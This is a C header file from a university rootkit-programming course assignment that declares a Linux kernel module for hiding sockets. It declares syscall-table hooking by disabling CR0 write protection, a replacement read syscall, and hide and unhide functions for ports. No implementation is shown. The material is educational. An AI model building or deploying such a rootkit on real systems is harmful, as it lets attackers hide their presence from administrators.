
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 6                                                             */
/*                                                                             */
/*   Filename: socket_masker.h                                                 */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage: Header file for kernel module `socket_masker.c`.                   */
/*                                                                             */
/*******************************************************************************/

#ifndef __SOCKET_MASKER__
#define __SOCKET_MASKER__

/* Definition of macros */
#define CR0_WRITE_PROTECT_MASK (1 << 16)
#define PRINT(str) printk(KERN_INFO "socket_masker rootkit: %s\n", (str));


/* Definition of global variables */
void **syscall_table;
asmlinkage long (*original_read_syscall)(unsigned int, char __user *, size_t);
int heartbeat_matched_so_far;


/* Declaration of functions */
void disable_write_protect_mode(void);
void enable_write_protect_mode(void);

asmlinkage long my_read_syscall(unsigned int, char __user *, size_t);
int count_matches(char *, char *, int *);

void hide_socket(int port);
void unhide_socket(int port);

#endif
